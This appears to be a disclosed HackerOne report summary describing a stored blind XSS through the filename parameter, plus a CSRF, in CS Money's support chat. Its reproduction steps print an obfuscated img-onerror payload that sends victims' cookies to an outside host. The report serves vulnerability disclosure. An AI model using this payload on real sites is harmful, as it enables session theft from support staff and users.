---
title: "Blind XSS on image upload via filename parameter + CSRF (CS Money support chat)"
url: "https://hackerone.com/reports/1010466"
vuln_class: "Cross-site Scripting (XSS) - Stored"
tech: "PHP, CS Money support.cs.money"
bounty: 1000
program: "CS Money"
severity: "critical"
votes: 449
content_quality: "full"
source: "HackerOne disclosed report"
date: 2020-12-26
---

## Summary
- CSRF: `support.cs.money/upload_file` performs no CSRF token / origin / referer verification.
- XSS: JavaScript executes from the `filename` parameter of the upload request.

## Steps to reproduce (XSS)
1. Use a proxy (Burp) with intercept on.
2. Upload a file to the support chat.
3. Change the filename to a payload such as:
   `"><img src=1 onerror="url=String['fromCharCode'](104,116,116,112,115,58,47,47,...)+encodeURIComponent(document['cookie']);xhttp=new XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();`
4. Open the chat support and the XSS activates.

## CSRF
Create an HTML page containing a form with a file whose name is the payload. Sending it
to a victim posts the image with the injected filename.

## Impact
Arbitrary JavaScript execution. Support agents trigger the XSS simply by viewing the
chat -- they do not need to click a link. The researcher notes the payload can be
forwarded by support, becoming a mass XSS affecting many users.
